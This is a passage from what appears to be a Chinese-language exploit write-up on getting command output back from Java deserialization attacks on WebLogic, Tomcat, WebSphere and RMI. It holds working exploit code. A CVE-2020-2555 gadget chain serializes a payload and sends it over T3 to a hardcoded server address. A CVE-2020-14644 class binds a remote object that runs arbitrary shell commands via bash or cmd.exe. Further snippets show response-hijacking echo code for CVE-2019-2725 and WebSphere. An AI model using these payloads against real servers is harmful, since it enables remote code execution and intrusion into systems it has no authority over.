            m_oAnchorTop.setAccessible(true);
            m_oAnchorTop.set(limitFilter, Runtime.class);
            // BadAttributeValueExpException toString()
            // This only works in JDK 8u76 and WITHOUT a security manager
            // https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException, limitFilter);
            // serialize
            byte[] payload = Serializables.serialize(badAttributeValueExpException);
            // T3 send, you can also use python script. weblogic_t3.py
            T3ProtocolOperation.send("10.251.0.116", "7001", payload);
            // test
            serialize(badAttributeValueExpException);
            System.out.print(payload);
    //        deserialize();
        }
        public static void serialize(Object obj) {
            try {
                ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("w2555.ser"));
                os.writeObject(obj);
                os.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        public static void deserialize() {
            try {
                ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
                is.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
看到无回显的CVE-2020-2555 payload 对于com.tangosol.util.filter.LimitFilter
的利用看起来真是似曾相识(commons-collections),，com.tangosol.util.extractor.ReflectionExtractor#extract中，调用了
invoke
,类比于CC中transform的invoke，模仿CC的回显思路，构造coherence的回显，关键的ReflectionExtractor[]构造如下
    ValueExtractor[] valueExtractors = new ValueExtractor[]{
    ? ? new ReflectionExtractor("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
    ? ? new ReflectionExtractor("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
    ? ? new ReflectionExtractor("defineClass",
    ? ? ? ? ? ? ? ? ? ? ? ? ? ?new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
    ? ? new ReflectionExtractor("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
    ? ? new ReflectionExtractor("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
    };
## 2.直接调用defineClass
### (1) CVE-2020-14644 回显实现
#### 1.漏洞原理分析
[Weblogic CVE-2020-14644
分析](https://mp.weixin.qq.com/s/uawEudfqvQ6E54Ev8APaaQ)
大致可以认为，是可以执行我们自定义类中statice代买块中的java代码，也就是，执行任意Java代码。
#### 2.回显实现
其实也是借用rmi实现的回显，但是更方便了，我们不用再借用CC或者coherence将整个rmi回显过程串联起来了(也就是省去了defineClass获取以及反射调用main绑定的步骤)，直接将我们的回显逻辑写到static代码块中，目标服务器直接执行即可。
直接看我们要执行的staic代码
    public class test implements Remotable, ClusterMasterRemote {
        static {
            try {
                String bindName = "UnicodeSec";
                Context ctx = new InitialContext();
                test remote = new test();
                ctx.rebind(bindName, remote);
                System.out.println("installed");
            } catch (Exception var1) {
                var1.printStackTrace();
            }
        }
        public test() {
        }
        @Override
        public RemoteConstructor getRemoteConstructor() {
            return null;
        }
        @Override
        public void setRemoteConstructor(RemoteConstructor remoteConstructor) {
        }
        @Override
        public void setServerLocation(String var1, String var2) throws RemoteException {
        }
        @Override
        public String getServerLocation(String cmd) throws RemoteException {
            try {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                List cmds = new ArrayList();
                if (isLinux) {
                    cmds.add("/bin/bash");
                    cmds.add("-c");
                    cmds.add(cmd);
                } else {
                    cmds.add("cmd.exe");
                    cmds.add("/c");
                    cmds.add(cmd);
                }
                ProcessBuilder processBuilder = new ProcessBuilder(cmds);
                processBuilder.redirectErrorStream(true);
                Process proc = processBuilder.start();
                BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                StringBuffer sb = new StringBuffer();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                return sb.toString();
            } catch (Exception e) {
                return e.getMessage();
            }
        }
    }
## 3.获取resp写入回显结果
### (1) Tomcat 通用回显
目的：获取返回包并写入回显内容
[站在巨人肩膀上](https://lucifaer.com/2020/05/12/Tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/#2-2-2-%E4%BB%8ERegistry%E4%B8%AD%E8%8E%B7%E5%8F%96)，实现逻辑如下
，这里注意下Mbeans的利用(给自己留个坑)
> Registry.getRegistry(null, null).getMBeanServer() ->
> JmxMBeanServer.mbsInterceptor -> DefaultMBeanServerInterceptor.repository ->
> Registory#query -> RequestInfo -> Http11Processor#getRequest() ->
> AbstractProcessor#getRequest() -> Request#getResponse() ->
> Response#doWrite()
具体实现demo
移步[https://xz.aliyun.com/t/7535](https://xz.aliyun.com/t/7535#toc-3)[#toc-3](https://xz.aliyun.com/t/7535#toc-3)
注：回显需要结合在每个gadget中，在反序列化漏洞利用中才能起到真实效果。这里对于gadget的要求最好是可以直接执行java代码，比如CC3
CC4，或者可以间接调用defineClass。当然了，如果漏洞本身就可以直接执行Java代码，那是再方便不过了。
### (2) Weblogic 2725 回显
https://github.com/welove88888/CVE-2019-2725
这个项目中使用的回显方式即先获取当前现成，从中获取返回respose，写入回显内容
代码参考
    String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader("lfcmd");
    weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();
    weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();
    outputStream.writeStream(new weblogic.xml.util.StringInputStream(lfcmd));
    outputStream.flush();
    response.getWriter().write("");
    java.lang.reflect.Field field = ((weblogic.servlet.provider.ContainerSupportProviderImpl.WlsRequestExecutor)this.getCurrentWork()).getClass().getDeclaredField("connectionHandler");
    field.setAccessible(true);
    HttpConnectionHandler httpConn = (HttpConnectionHandler) field.get(this.getCurrentWork());
    httpConn.getServletRequest().getResponse().getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream("xxxxxx"));
结合CVE-2019-2725这个漏洞，需要将上面的类转化为xml格式，weblogic
xmldecoder反序列化漏洞，从漏洞角度来说，是支持调用任意类的任意方法，这里直接使用org.mozilla.classfile.DefiningClassLoader的defineClass方法将回显写入类实例化执行。
其实，这里也可以结合rmi实现回显的方式，毕竟都可以调用defineClass了。
### (3) Websphere 回显
大体思路也是从线程中获取request respose
参考
    Thread t = Thread.currentThread();
    Field wsThreadLocals = t.getClass().getDeclaredField("wsThreadLocals");
    wsThreadLocals.setAccessible(true);
    Object[] obs = (Object[])wsThreadLocals.get(t);
    WebContainerRequestState wr = (WebContainerRequestState)obs[36];
    wr.getCurrentThreadsIExtendedRequest().getRequestURL();
### (4) Spring Boot 回显
网上也有结合Spring Boot 进行回显，弱弱说一句，直接可以利用中间件回显，这个就Pass了先。
## 4.异常抛出 报错回显
### (1) 带回显的攻击RMI服务
这里我们需要跟一下RMI的流程中 **客户端的lookup方法**
站在巨人肩膀上(其实就是偷个懒)
在UnicastRef类的newCall方法中与服务端建立Socket连接，并发送一些约定的数据
通过ref.invoke方法处理服务端响应回来的序列化数据。
因为在lookup之前执行了getRegisty方法，返回的是RegistryImpl_Stub对象，所以这里的lookup调用的是RegistryImpl_Stub的lookup，我们跟进，已经将关键位置标红
**1.首先进入UnicastRef类的newCall方法：**
**1.1 首先是获取了一个TCP连接，**
可以看到是使用LiveRef去创建的连接，在调试RMIServer时，我们已经知道LiveRef中包含TCPEndpoint属性，其中包含ip与端口等通信信息：
**1.2再往下走，看到new了一个StreamRemoteCall**
对象，进入StreamRemoteCall的构造方法，其做了如下操作，往服务端发送了一些数据：
**2.回到lookup继续往下走**
，执行了ObjectOutput.writeObject，这里是将lookup方法中传递的远程服务的名称，即字符串“HelloService”进行了序列化并发往了服务端，然后又执行了super.ref.invoke方法，进入该方法如下，然后继续往下走，
通过ref.invoke方法处理服务端响应回来的序列化数据。
**3\. lookup往下走，进入StreamRemoteCall类的executeCall方法**
，可以猜到该方法就是处理第7步往服务端发送数据后的服务端响应的数据，看到从响应数据中先读取了一个字节，值为81，然后又继续读取一个字节赋值给var1，
下面是判断var1的值，为1直接return，说明没问题，如果为2的话，会先对对象进行反序列化操作，然后判断是否为Exception类型
网上有关于带回显的攻击RMI服务的exp，它就是将执行完命令后的结果写到异常信息里，然后抛出该异常，这样在客户端就可以看到命令执行的结果了，这时得到的var1的值就是2
当上一步var1值为1时，说明没问题，再回到lookup，会执行ObjectInput.readObject方法将服务端返回的数据反序列化，然后将该对象返回（前面我们也知道了，这里获取到的其实是一个代理对象）。至此，客户端整个请求的过程也梳理完了
### (2) URLClassLoader加载远程恶意类，抛出异常回显
首先构造恶意类，将执行结果作为异常抛出
但后利用某个反序列化利用链，调用URLClassloader，远程加载恶意类并执行实现回显
这里是CC5
By the way URLClassLoader换成defineClass，利用起来不用出网了就。
## 5.写文件
顾名思义，直接写文件到目标，访问读取，不再赘述
## 6.Dnslog
dnslog方式
# 三、参考链接
* * *